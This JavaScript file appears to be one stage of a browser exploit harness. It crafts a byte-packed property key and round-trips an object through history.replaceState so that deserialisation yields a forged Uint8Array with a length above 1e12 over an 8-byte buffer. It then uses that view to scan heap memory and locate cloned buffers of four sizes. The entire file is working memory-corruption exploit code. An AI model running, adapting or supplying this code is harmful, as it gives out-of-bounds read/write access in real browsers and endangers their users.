// Locate cloned fixed buffers of four sizes within the forged-view window.
function makeKey() {
  var bytes = [0, 0, 0, 0x16, 0x02, 8];
  for (var i = 1; i < 8; i++) bytes.push(0);
  bytes.push(0xf8);
  for (var j = 1; j < 8; j++) bytes.push(0xff);
  bytes.push(0x13, 3, 0, 0xff, 0xff, 0xff, 0xff);
  var chars = [];
  for (var k = 0; k < bytes.length; k += 2)
    chars.push(String.fromCharCode(bytes[k] | bytes[k + 1] << 8));
  return (chars.join("") + "A".repeat(256)).slice(0, 256);
}
function mark(name) {
  if (api && typeof api.markSync === "function") api.markSync(name);
}
var phase = "build";
var result;
try {
  var sizes = [8192, 16384, 32768, 65536];
  var backing = new ArrayBuffer(8, { maxByteLength: 16 });
  new Uint8Array(backing).fill(0x41);
  var filler = new Array(253);
  filler[0] = BigInt(1) << BigInt(40);
  filler[1] = backing;
  for (var p = 0; p < sizes.length; p++) {
    var fixed = new ArrayBuffer(sizes[p]);
    new Uint8Array(fixed).fill(0x91 + p);
    filler[2 + p] = fixed;
  }
  for (var n = 6; n < 27; n++) {
    var neighbor = new ArrayBuffer(8, { maxByteLength: 16 });
    new Uint8Array(neighbor).fill(0x40 + n);
    filler[n] = neighbor;
  }
  for (var f = 27; f < filler.length; f++) filler[f] = {};
  var shared = { marker: 0x51515151 };
  var input = { filler: filler, first: shared, second: shared };
  input[makeKey()] = 0;
  history.replaceState(input, "");
  mark("size_map_stored");
  phase = "load";
  var output = history.state;
  mark("size_map_loaded");
  var target = output.filler[1];
  var synthetic = output["\u0000"];
  var clones = [];
  for (var c = 0; c < sizes.length; c++)
    clones.push(new Uint8Array(output.filler[2 + c]));
  var valid = synthetic instanceof Uint8Array && synthetic.buffer === target &&
      synthetic.byteOffset === 8 && synthetic.length > 1e12 &&
      target.byteLength === 8 && clones.every(function (view, i) {
        return view.length === sizes[i];
      });
  var firsts = [-1, -1, -1, -1];
  var counts = [0, 0, 0, 0];
  var mapped = [false, false, false, false];
  var restored = [false, false, false, false];
  if (valid) {
    phase = "map";
    var limit = 524288;
    var baseline = new Uint8Array(limit);
    for (var b = 0; b < limit; b++) baseline[b] = synthetic[b];
    mark("size_map_baseline");
    for (var m = 0; m < sizes.length; m++) {
      clones[m].fill(0xc4);
      for (var q = 0; q < limit; q++) {
        if (synthetic[q] !== baseline[q]) {
          if (firsts[m] < 0) firsts[m] = q;
          counts[m]++;
        }
      }
      clones[m].fill(0x91 + m);
      mapped[m] = firsts[m] >= 0 && counts[m] === sizes[m] &&
          firsts[m] + sizes[m] <= limit;
      restored[m] = clones[m][0] === 0x91 + m &&
          clones[m][sizes[m] - 1] === 0x91 + m &&
          (!mapped[m] ||
            (synthetic[firsts[m]] === 0x91 + m &&
             synthetic[firsts[m] + sizes[m] - 1] === 0x91 + m));
    }
    mark("size_map_done");
  }
  result = { id: "buffer_size_map", status:
      valid && restored.every(function (x) { return x; }) ? "pass" : "fail",
    details: {
      view_valid: valid, sizes: sizes.join(","),
      first_indices: firsts.join(","), changed_counts: counts.join(","),
      mapped: mapped.join(","), restored: restored.join(","),
      target_first: new Uint8Array(target)[0]
    } };
} catch (error) {
  result = { id: "buffer_size_map", status: "error", details: {
    phase: phase, error: String(error).slice(0, 200)
  } };
}
try { history.replaceState(null, ""); }
catch (error) { result.status = "error"; result.details.cleanup_error =
    String(error).slice(0, 100); }
return [result];
